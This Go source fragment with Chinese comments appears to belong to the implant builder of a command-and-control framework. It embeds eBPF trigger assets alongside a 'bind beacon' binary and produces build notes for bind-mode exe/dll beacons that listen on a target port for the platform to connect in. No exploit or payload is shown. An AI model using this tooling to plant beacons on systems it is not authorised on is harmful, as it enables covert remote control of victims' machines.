// 与 bind beacon 二进制一起打包。资产明细见 ebpf_trigger/README.md。

//go:embed ebpf_trigger
var ebpfTriggerFS embed.FS

// EbpfTriggerAssets 返回 eBPF 触发器源码资产(路径 → 字节;路径保留 ebpf_trigger/ 前缀)。
func EbpfTriggerAssets() (map[string][]byte, error) {
	out := map[string][]byte{}
	entries, err := ebpfTriggerFS.ReadDir("ebpf_trigger")
	if err != nil {
		return nil, fmt.Errorf("eBPF 触发器资产缺失: %w", err)
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		b, rerr := ebpfTriggerFS.ReadFile("ebpf_trigger/" + e.Name())
		if rerr != nil {
			return nil, rerr
		}
		out["ebpf_trigger/"+e.Name()] = b
	}
	return out, nil
}

// bindBuildDoc bind 方向 exe/dll 产物的编译说明。
func bindBuildDoc(target string, bindPort int) string {
	note := fmt.Sprintf("\nbind 方向注记:beacon 在目标机监听 %d 端口等平台正向连入(帧格式同 tcp 传输,首帧 reg);平台侧经「正向连接」(NewOutboundConn)建会话。\n", bindPort)
	return csharedBuildDoc(target) + note
}
